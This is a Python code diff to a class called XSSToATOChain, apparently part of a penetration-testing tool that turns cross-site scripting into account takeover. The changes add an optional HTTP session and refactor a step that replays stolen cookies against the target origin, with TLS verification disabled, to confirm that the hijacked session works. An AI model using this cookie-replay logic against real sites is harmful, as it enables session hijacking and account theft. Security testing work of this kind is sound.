@@ -1522,6 +1522,9 @@ class XSSToATOChain:
 
     CALLBACK_TIMEOUT = 15  # saniye
 
+    def __init__(self, session=None):
+        self._session = session  # optional SmartSession for HTTP fallback
+
     def generate_poc(
         self,
         xss_url: str,
@@ -1727,12 +1730,12 @@ class XSSToATOChain:
             logger.debug(f"[ATO] Selenium başarısız: {e!r}")
             return False
 
-    @staticmethod
-    def _try_requests(url: str) -> bool:
+    def _try_requests(self, url: str) -> bool:
         """Requests ile URL'ye istek at (server-side render için)."""
         try:
-            import requests
-            requests.get(url, timeout=5, verify=False)
+            import requests as _req
+            _getter = self._session.get if self._session is not None else _req.Session().get
+            _getter(url, timeout=5, verify=False)
             return True
         except Exception:
             return False
@@ -1743,14 +1746,16 @@ class XSSToATOChain:
         if not sess.cookies or not sess.origin_url:
             return sess
         try:
-            import requests
+            import requests as _req
             from urllib.parse import urlparse
             origin = urlparse(sess.origin_url)
             base = f"{origin.scheme}://{origin.netloc}"
-            r = requests.get(
-                base, cookies=sess.cookies,
-                timeout=5, verify=False, allow_redirects=True,
-            )
+            # Use a fresh session with ONLY the stolen cookies (not the scan session)
+            with _req.Session() as _s:
+                r = _s.get(
+                    base, cookies=sess.cookies,
+                    timeout=5, verify=False, allow_redirects=True,
+                )
             sess.verified = r.status_code < 400
             sess.verification_url = base
             sess.verification_status = r.status_code
